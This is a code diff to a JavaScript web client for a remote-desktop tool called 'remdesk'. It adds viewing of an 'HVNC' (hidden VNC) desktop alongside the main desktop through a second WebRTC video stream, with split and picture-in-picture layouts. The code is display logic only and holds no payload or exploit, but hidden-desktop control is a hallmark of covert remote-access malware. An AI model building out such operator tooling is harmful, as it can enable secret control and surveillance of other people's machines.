@@ -487,6 +487,21 @@
     state.pendingAppLaunch = null;
     state.textInputSupported = true;
     state.pendingIce = [];
+    
+    // Clean up dual-stream state
+    state.dualStreamActive = false;
+    state.dualStreamMode = "main";
+    state.mainVideoTrack = null;
+    state.hvncVideoTrack = null;
+    if (dom.hvncScreenEl) {
+      dom.hvncScreenEl.srcObject = null;
+      dom.hvncScreenEl.style.display = "none";
+    }
+    if (dom.dualStreamControls) {
+      dom.dualStreamControls.style.display = "none";
+    }
+    document.body.classList.remove("hvnc-primary", "dual-stream-split", "dual-stream-pip");
+    
     if (remdesk.releasePointerLock) {
       remdesk.releasePointerLock();
     }
@@ -792,23 +807,81 @@
       }
       startSignalingPing(signalingSocket, sessionId);
 
+      // Track counter for dual-stream detection
+      let videoTrackCount = 0;
+      
       state.peerConnection.ontrack = (event) => {
         console.info("Received track:", {
           kind: event.track.kind,
           id: event.track.id,
+          label: event.track.label,
           readyState: event.track.readyState,
           streams: event.streams.length
         });
+        
         if (event.track.kind === "video") {
-          if (event.streams && event.streams[0]) {
-            dom.screenEl.srcObject = event.streams[0];
-            console.info("Video stream attached to screen element");
-          } else {
-            // Create a new MediaStream with just this track
-            const stream = new MediaStream([event.track]);
-            dom.screenEl.srcObject = stream;
-            console.info("Created new MediaStream for video track");
+          videoTrackCount++;
+          const trackId = event.track.id || "";
+          const trackLabel = event.track.label || "";
+          
+          // Detect if this is a dual-stream setup by track id/label
+          const isMainDesktop = trackId.includes("main") || trackLabel.toLowerCase().includes("main");
+          const isHvncDesktop = trackId.includes("hvnc") || trackLabel.toLowerCase().includes("hvnc");
+          
+          console.info("Video track analysis:", {
+            trackNumber: videoTrackCount,
+            isMainDesktop,
+            isHvncDesktop,
+            trackId,
+            trackLabel
+          });
+          
+          // Create stream for this track
+          const stream = event.streams && event.streams[0] 
+            ? event.streams[0] 
+            : new MediaStream([event.track]);
+          
+          if (videoTrackCount === 1) {
+            // First video track - could be main or only track
+            if (isHvncDesktop) {
+              // This is HVNC track (single-stream hvnc mode)
+              dom.screenEl.srcObject = stream;
+              state.hvncVideoTrack = event.track;
+              console.info("HVNC video stream attached as primary");
+            } else {
+              // This is main desktop track (normal mode or first of dual-stream)
+              dom.screenEl.srcObject = stream;
+              state.mainVideoTrack = event.track;
+              console.info("Main video stream attached to primary screen");
+            }
+          } else if (videoTrackCount === 2) {
+            // Second video track - this is dual-stream mode!
+            state.dualStreamActive = true;
+            console.info("Dual-stream mode detected!");
+            
+            if (isHvncDesktop || !isMainDesktop) {
+              // Second track is HVNC
+              state.hvncVideoTrack = event.track;
+              if (dom.hvncScreenEl) {
+                dom.hvncScreenEl.srcObject = stream;
+                console.info("HVNC video stream attached to secondary screen");
+              }
+            } else {
+              // Second track is main desktop (means first was HVNC)
+              state.mainVideoTrack = event.track;
+              // Swap streams - main goes to primary, hvnc to secondary
+              const hvncStream = dom.screenEl.srcObject;
+              dom.screenEl.srcObject = stream;
+              if (dom.hvncScreenEl) {
+                dom.hvncScreenEl.srcObject = hvncStream;
+              }
+              console.info("Swapped streams: main now primary, hvnc secondary");
+            }
+            
+            // Show dual-stream controls
+            remdesk.showDualStreamControls();
           }
+          
           remdesk.updateScreenLayout();
         } else if (event.track.kind === "audio") {
           // Handle audio track if needed
@@ -836,7 +909,13 @@
         }
       };
 
+      // Add video transceivers
+      // For HVNC mode, add 2 video transceivers to support dual-stream
       state.peerConnection.addTransceiver("video", { direction: "recvonly" });
+      if (sessionMode === "hvnc") {
+        state.peerConnection.addTransceiver("video", { direction: "recvonly" });
+        console.info("Added second video transceiver for HVNC dual-stream");
+      }
       state.peerConnection.addTransceiver("audio", { direction: "recvonly" });
 
       state.controlChannel = state.peerConnection.createDataChannel("control");
@@ -1029,6 +1108,112 @@
     }
   }
 
+  // Dual-stream controls
+  function showDualStreamControls() {
+    if (!dom.dualStreamControls) return;
+    
+    state.dualStreamActive = true;
+    dom.dualStreamControls.style.display = "flex";
+    
+    // Set up toggle button
+    if (dom.dualStreamToggle && !dom.dualStreamToggle._bound) {
+      dom.dualStreamToggle._bound = true;
+      dom.dualStreamToggle.addEventListener("click", toggleDualStreamView);
+    }
+    
+    updateDualStreamIndicators();
+    console.info("Dual-stream controls shown");
+  }
+  
+  function hideDualStreamControls() {
+    if (!dom.dualStreamControls) return;
+    
+    state.dualStreamActive = false;
+    state.dualStreamMode = "main";
+    dom.dualStreamControls.style.display = "none";
+    
+    // Reset video elements
+    document.body.classList.remove("hvnc-primary", "dual-stream-split", "dual-stream-pip");
+    if (dom.hvncScreenEl) {
+      dom.hvncScreenEl.style.display = "none";
+    }
+    
+    console.info("Dual-stream controls hidden");
+  }
+  
+  function toggleDualStreamView() {
+    if (!state.dualStreamActive) return;
+    
+    // Cycle through modes: main -> hvnc -> split -> pip -> main
+    const modes = ["main", "hvnc", "split", "pip"];
+    const currentIndex = modes.indexOf(state.dualStreamMode);
+    const nextIndex = (currentIndex + 1) % modes.length;
+    state.dualStreamMode = modes[nextIndex];
+    
+    applyDualStreamMode(state.dualStreamMode);
+    updateDualStreamIndicators();
+    
+    console.info("Dual-stream mode:", state.dualStreamMode);
+  }
+  
+  function setDualStreamMode(mode) {
+    if (!state.dualStreamActive) return;
+    if (!["main", "hvnc", "split", "pip"].includes(mode)) return;
+    
+    state.dualStreamMode = mode;
+    applyDualStreamMode(mode);
+    updateDualStreamIndicators();
+  }
+  
+  function applyDualStreamMode(mode) {
+    // Remove all mode classes
+    document.body.classList.remove("hvnc-primary", "dual-stream-split", "dual-stream-pip");
+    
+    switch (mode) {
+      case "hvnc":
+        // HVNC as primary view
+        document.body.classList.add("hvnc-primary");
+        break;
+      case "split":
+        // Side-by-side view
+        document.body.classList.add("dual-stream-split");
+        break;
+      case "pip":
+        // Picture-in-picture (HVNC in corner)
+        document.body.classList.add("dual-stream-pip");
+        break;
+      case "main":
+      default:
+        // Main desktop as primary (default)
+        break;
+    }
+    
+    remdesk.updateScreenLayout();
+  }
+  
+  function updateDualStreamIndicators() {
+    if (!dom.dualStreamLabel) return;
+    
+    const labels = {
+      main: "Main Desktop",
+      hvnc: "HVNC Desktop",
+      split: "Split View",
+      pip: "Picture-in-Picture"
+    };
+    
+    dom.dualStreamLabel.textContent = labels[state.dualStreamMode] || "Main Desktop";
+    
+    // Update indicator dots
+    if (dom.mainIndicator) {
+      dom.mainIndicator.classList.toggle("main-active", 
+        state.dualStreamMode === "main" || state.dualStreamMode === "split" || state.dualStreamMode === "pip");
+    }
+    if (dom.hvncIndicator) {
+      dom.hvncIndicator.classList.toggle("hvnc-active", 
+        state.dualStreamMode === "hvnc" || state.dualStreamMode === "split" || state.dualStreamMode === "pip");
+    }
+  }
+
   remdesk.isSecureCryptoAvailable = isSecureCryptoAvailable;
   remdesk.isE2eeEnvelope = isE2eeEnvelope;
   remdesk.base64EncodeBytes = base64EncodeBytes;
@@ -1051,4 +1236,9 @@
   remdesk.sendStreamProfile = sendStreamProfile;
   remdesk.cleanupConnection = cleanupConnection;
   remdesk.connect = connect;
+  // Dual-stream functions
+  remdesk.showDualStreamControls = showDualStreamControls;
+  remdesk.hideDualStreamControls = hideDualStreamControls;
+  remdesk.toggleDualStreamView = toggleDualStreamView;
+  remdesk.setDualStreamMode = setDualStreamMode;
 })();
